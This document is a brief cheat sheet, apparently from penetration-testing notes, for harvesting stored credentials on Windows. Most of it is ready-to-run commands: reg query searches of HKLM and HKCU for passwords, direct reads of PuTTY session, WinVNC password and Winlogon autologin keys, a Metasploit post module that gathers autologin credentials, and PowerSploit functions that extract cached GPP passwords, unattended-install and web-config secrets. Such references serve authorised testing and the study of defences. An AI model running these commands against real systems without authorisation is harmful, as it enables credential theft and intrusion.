# Credentials in Registry

### 1) Cmd

##### String matching in registry

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

##### Putty

    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /t REG_SZ /s

##### VNC

    reg query "HKCU\Software\ORL\WinVNC3\Password"

##### Windows autologin

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

### 2) Metasploit

    post/windows/gather/credentials/windows_autologin

### 3) Powersploit

##### Import privesc module

    Import-Module .\Privesc.psd1

    Get-UnattendedInstallFile
    Get-Webconfig
    Get-ApplicationHost
    Get-SiteListPassword
    Get-CachedGPPPassword
    Get-RegistryAutoLogon
